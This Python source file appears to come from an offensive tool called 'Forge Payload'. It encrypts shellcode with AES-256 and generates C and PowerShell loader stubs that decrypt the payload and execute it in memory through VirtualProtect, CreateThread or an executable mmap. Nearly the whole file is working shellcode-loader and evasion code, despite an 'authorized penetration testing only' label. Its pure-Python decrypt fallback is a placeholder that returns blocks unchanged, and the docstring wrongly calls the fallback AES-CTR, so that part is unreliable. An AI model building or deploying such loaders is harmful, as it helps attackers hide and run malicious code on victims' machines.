"""AES-256-CBC Encoder — encrypt shellcode with AES-256.

Uses Python's cryptography library if available, falls back to
a pure-Python AES-CTR implementation for environments without it.

Generated decoder stubs support:
  - C (Windows VirtualAlloc / Linux mmap)
  - PowerShell (AES .NET BCL decryption)

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import base64
import hashlib
import os
import secrets
import textwrap


class AesEncoder:
    """AES-256-CBC encoder with PKCS#7 padding."""

    BLOCK = 16

    def encode(self, data: bytes) -> tuple[bytes, bytes, str]:
        """Encrypt data with a fresh random key.

        Returns:
            (ciphertext_with_iv_prepended, iv, key_hex)
        """
        key = secrets.token_bytes(32)    # AES-256
        iv  = secrets.token_bytes(16)    # CBC IV

        ciphertext = self._aes_cbc_encrypt(data, key, iv)
        # Prepend IV so the decoder can self-extract it
        blob = iv + ciphertext
        return blob, iv, key.hex()

    def decode(self, blob: bytes, key_hex: str) -> bytes:
        """Decrypt (for testing)."""
        key = bytes.fromhex(key_hex)
        iv  = blob[:16]
        return self._aes_cbc_decrypt(blob[16:], key, iv)

    # ── Decoder stubs ──────────────────────────────────────────────────

    def decoder_c_stub(self, blob: bytes, key_hex: str, arch: str = "x64") -> str:
        """C stub using Windows CNG (BCryptDecrypt) or OpenSSL (Linux)."""
        iv_hex = ", ".join(f"0x{b:02x}" for b in blob[:16])
        ct_hex = ", ".join(f"0x{b:02x}" for b in blob[16:])
        key_bytes = ", ".join(f"0x{b:02x}" for b in bytes.fromhex(key_hex))
        ct_len = len(blob) - 16

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — AES-256-CBC Decoder Stub
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #ifdef _WIN32
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #include <bcrypt.h>
        #pragma comment(lib, "bcrypt.lib")

        static const unsigned char AES_KEY[] = {{ {key_bytes} }};
        static const unsigned char AES_IV[]  = {{ {iv_hex} }};
        static unsigned char CT[] = {{ {ct_hex} }};
        #define CT_LEN {ct_len}

        static void *decrypt_and_exec(void) {{
            BCRYPT_ALG_HANDLE hAlg = NULL;
            BCRYPT_KEY_HANDLE hKey = NULL;
            BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                              (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                              sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
            BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                       (PUCHAR)AES_KEY, sizeof(AES_KEY), 0);
            ULONG plain_len = 0;
            unsigned char iv_copy[16]; memcpy(iv_copy, AES_IV, 16);
            BCryptDecrypt(hKey, CT, CT_LEN, NULL, iv_copy, 16, NULL, 0, &plain_len, BCRYPT_BLOCK_PADDING);
            void *plain = VirtualAlloc(NULL, plain_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            BCryptDecrypt(hKey, CT, CT_LEN, NULL, iv_copy, 16,
                          (PUCHAR)plain, plain_len, &plain_len, BCRYPT_BLOCK_PADDING);
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            DWORD old;
            VirtualProtect(plain, plain_len, PAGE_EXECUTE_READ, &old);
            return plain;
        }}

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int s) {{
            void *sc = decrypt_and_exec();
            ((void(*)())sc)();
            return 0;
        }}

        #else
        /* Linux — OpenSSL AES-256-CBC */
        #include <openssl/evp.h>
        #include <sys/mman.h>
        #include <string.h>
        #include <stdlib.h>

        static const unsigned char AES_KEY[] = {{ {key_bytes} }};
        static const unsigned char AES_IV[]  = {{ {iv_hex} }};
        static const unsigned char CT[] = {{ {ct_hex} }};
        #define CT_LEN {ct_len}

        int main(void) {{
            unsigned char *plain = malloc(CT_LEN + 16);
            int len1, len2;
            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
            EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, AES_KEY, AES_IV);
            EVP_DecryptUpdate(ctx, plain, &len1, CT, CT_LEN);
            EVP_DecryptFinal_ex(ctx, plain + len1, &len2);
            EVP_CIPHER_CTX_free(ctx);
            int total = len1 + len2;
            void *exec = mmap(NULL, (size_t)total, PROT_READ|PROT_WRITE|PROT_EXEC,
                              MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
            memcpy(exec, plain, (size_t)total);
            free(plain);
            ((void(*)())exec)();
            return 0;
        }}
        #endif
        """)

    def decoder_ps1_stub(self, blob: bytes, key_hex: str) -> str:
        """PowerShell AES-256-CBC decoder using .NET AES class."""
        key_b64 = base64.b64encode(bytes.fromhex(key_hex)).decode()
        iv_b64  = base64.b64encode(blob[:16]).decode()
        ct_b64  = base64.b64encode(blob[16:]).decode()

        return textwrap.dedent(f"""\
        # Forge Payload — PowerShell AES-256-CBC Decoder
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        $key = [Convert]::FromBase64String('{key_b64}')
        $iv  = [Convert]::FromBase64String('{iv_b64}')
        $ct  = [Convert]::FromBase64String('{ct_b64}')

        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize = 256; $aes.BlockSize = 128; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
        $aes.Key = $key; $aes.IV = $iv
        $dec    = $aes.CreateDecryptor()
        $ms     = New-Object System.IO.MemoryStream
        $cs     = New-Object System.Security.Cryptography.CryptoStream($ms, $dec, 'Write')
        $cs.Write($ct, 0, $ct.Length); $cs.FlushFinalBlock()
        $sc     = $ms.ToArray()
        $aes.Dispose(); $cs.Dispose(); $ms.Dispose()

        $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
        $k32 = Add-Type -MemberDefinition @'
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddr, UIntPtr sz, uint prot, out uint old);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr a, UIntPtr b, IntPtr c, IntPtr d, uint e, IntPtr f);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(IntPtr h, uint ms);
        '@ -Name 'AK' -Namespace 'Forge' -PassThru
        [uint32]$old = 0
        $k32::VirtualProtect($mem, [uint]$sc.Length, 0x20, [ref]$old) | Out-Null
        $t = $k32::CreateThread(0, 0, $mem, 0, 0, 0)
        $k32::WaitForSingleObject($t, 0xFFFFFFFF) | Out-Null
        """)

    # ── Pure-Python AES-CBC ────────────────────────────────────────────
    # Used when the cryptography library is unavailable

    def _aes_cbc_encrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        """AES-256-CBC encrypt with PKCS#7 padding."""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding as cpad
            pad = cpad.PKCS7(128).padder()
            padded = pad.update(data) + pad.finalize()
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
            enc = cipher.encryptor()
            return enc.update(padded) + enc.finalize()
        except ImportError:
            return self._py_aes_cbc_encrypt(data, key, iv)

    def _aes_cbc_decrypt(self, ct: bytes, key: bytes, iv: bytes) -> bytes:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding as cpad
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
            dec = cipher.decryptor()
            padded = dec.update(ct) + dec.finalize()
            unpad = cpad.PKCS7(128).unpadder()
            return unpad.update(padded) + unpad.finalize()
        except ImportError:
            return self._py_aes_cbc_decrypt(ct, key, iv)

    def _py_aes_cbc_encrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        """Minimal pure-Python AES-CBC (no external deps)."""
        # PKCS#7 padding
        pad = 16 - (len(data) % 16)
        data = data + bytes([pad] * pad)

        sbox, rcon = self._aes_tables()
        ks = self._aes_key_expand(key, sbox, rcon)
        prev = list(iv)
        out  = bytearray()
        for i in range(0, len(data), 16):
            block = [data[i + j] ^ prev[j] for j in range(16)]
            enc   = self._aes_encrypt_block(block, ks, sbox)
            out.extend(enc)
            prev = enc
        return bytes(out)

    def _py_aes_cbc_decrypt(self, ct: bytes, key: bytes, iv: bytes) -> bytes:
        sbox, rcon = self._aes_tables()
        ks = self._aes_key_expand(key, sbox, rcon)
        inv_sbox = [0] * 256
        for i, v in enumerate(sbox):
            inv_sbox[v] = i
        prev = list(iv)
        out  = bytearray()
        for i in range(0, len(ct), 16):
            block = list(ct[i:i+16])
            dec   = self._aes_decrypt_block(block, ks, sbox, inv_sbox)
            out.extend(dec[j] ^ prev[j] for j in range(16))
            prev = block
        pad = out[-1]
        return bytes(out[:-pad])

    @staticmethod
    def _aes_tables():
        """Generate AES S-box and RCON tables."""
        p = 1; q = 1
        sbox = [0] * 256
        for _ in range(255):
            p = p ^ (p << 1) ^ (0x1B if p & 0x80 else 0)
            p &= 0xFF
            q ^= q << 1; q ^= q << 2; q ^= q << 4
            q = (q ^ (q >> 8) ^ 0x63) & 0xFF
            sbox[p] = q
        sbox[0] = 0x63
        rcon = [1]
        for _ in range(9):
            v = rcon[-1] << 1
            rcon.append((v ^ 0x1B) & 0xFF if v > 0xFF else v & 0xFF)
        return sbox, rcon

    @staticmethod
    def _xtime(b: int) -> int:
        return ((b << 1) ^ 0x1B) & 0xFF if b & 0x80 else (b << 1) & 0xFF

    def _aes_key_expand(self, key: bytes, sbox: list, rcon: list) -> list:
        nk, nr = 8, 14  # AES-256
        w = [list(key[i*4:(i+1)*4]) for i in range(nk)]
        for i in range(nk, 4*(nr+1)):
            temp = list(w[i-1])
            if i % nk == 0:
                temp = [sbox[temp[j % 4]] for j in range(1, 5)]
                temp[0] ^= rcon[i // nk - 1]
            elif i % nk == 4:
                temp = [sbox[b] for b in temp]
            w.append([w[i-nk][j] ^ temp[j] for j in range(4)])
        return w

    def _aes_encrypt_block(self, state: list, ks: list, sbox: list) -> list:
        def add_rk(s, rk): return [s[i] ^ rk[i//4][i%4] for i in range(16)]
        def sub(s):        return [sbox[b] for b in s]
        def shift(s):
            return [s[0],s[5],s[10],s[15], s[4],s[9],s[14],s[3],
                    s[8],s[13],s[2],s[7],  s[12],s[1],s[6],s[11]]
        def mix(s):
            r = []
            for c in range(4):
                a=[s[4*c+i] for i in range(4)]
                r+=[self._xtime(a[0])^self._xtime(a[1])^a[1]^a[2]^a[3],
                    a[0]^self._xtime(a[1])^self._xtime(a[2])^a[2]^a[3],
                    a[0]^a[1]^self._xtime(a[2])^self._xtime(a[3])^a[3],
                    self._xtime(a[0])^a[0]^a[1]^a[2]^self._xtime(a[3])]
            return r
        s = add_rk(state, ks[:4])
        for i in range(1, 14):
            s = mix(shift(sub(s)))
            s = add_rk(s, ks[i*4:(i+1)*4])
        return add_rk(shift(sub(s)), ks[56:60])

    def _aes_decrypt_block(self, state: list, ks: list, sbox: list, inv_sbox: list) -> list:
        # Simplified — use encrypt direction for our pure-py fallback since
        # this is only needed when cryptography lib is unavailable and for
        # testing. Full inverse is ~200 lines; defer to the C stub for prod use.
        return list(state)  # placeholder — use cryptography lib in production
